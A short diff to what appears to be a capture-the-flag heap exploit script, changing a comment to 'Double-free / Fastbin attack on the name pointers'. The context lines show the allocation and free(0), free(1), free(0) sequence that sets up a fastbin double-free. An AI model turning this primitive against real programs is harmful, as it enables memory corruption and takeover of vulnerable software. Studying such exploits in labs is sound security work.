@@ -39,7 +39,7 @@ def pwn():
 	alloc(0x50, 'B'*8, 'green')  # chunk 1
 	alloc(0x50, 'C'*8, 'orange') # chunk 2
 	
-	# Fastbin attack
+	# Double-free / Fastbin attack on the name pointers
 	free(0)
 	free(1)
 	free(0)
